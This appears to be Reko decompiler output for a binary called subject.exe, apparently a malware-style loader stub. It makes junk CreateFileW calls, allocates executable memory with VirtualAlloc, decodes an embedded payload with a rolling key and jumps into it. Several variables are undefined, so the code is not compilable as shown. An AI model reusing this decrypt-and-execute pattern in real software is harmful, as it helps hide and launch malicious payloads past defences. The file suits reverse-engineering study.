// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 0040AE59: Register Eq_2 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	return fn0040AE67(dwLoc04);
}

// 0040AE67: Register word32 fn0040AE67(Stack word32 dwArg00)
word32 fn0040AE67(word32 dwArg00)
{
	int32 esi_2 = 0x00;
	do
	{
		byte al_23 = (byte) (CreateFileW(null, 0x1C, 1715048, null, 0x14, 0x0050D0EE, null) & 0x9F);
		esi_2 = esi_2 + (word32) al_23;
	} while (esi_2 >= 0x40394B31);
	Eq_11 eax_45 = VirtualAlloc(0x00, 0x0001368F, 0x3000, 0x40);
	Eq_11 edi_51 = eax_45;
	byte * esi_52 = dwArg00 + 0xF3;
	word32 ecx_112 = 0x01DB;
	uint32 edx_101 = 3739363512;
	byte dl_102 = 0xB8;
	Eq_34 ebp_103 = null;
	do
	{
		byte bh_73 = *esi_52 + dl_102 + al_23;
		*edi_51 = bh_73;
		edx_101 = edx_101 >> 0x08;
		esi_52 = esi_52 + 0x01;
		edi_51 = edi_51 + 0x01;
		dl_102 = (byte) edx_101;
		ebp_103 = (Eq_34) ((char *) ebp_103 + 0x01);
		if (ebp_103 == CreateFileW(null, 0x00C33670, 0x17, null, 0x11, 0x0F, null) + 0x05)
		{
			edx_101 = 3739363512;
			dl_102 = 0xB8;
			ebp_103 = null;
		}
		ecx_112 = ecx_141 - 0x01;
		word32 ecx_141 = ecx_112;
	} while (ecx_141 != 0x01);
	word32 esp_119;
	word32 esi_120;
	byte SZO_121;
	byte C_122;
	word32 eax_123;
	word32 edx_124;
	byte dl_125;
	byte al_126;
	byte SCZO_127;
	byte SO_128;
	byte bl_129;
	word32 ecx_130;
	word32 edi_131;
	word32 ebp_132;
	byte bh_133;
	byte Z_134;
	eax_45();
	return eax_123;
}

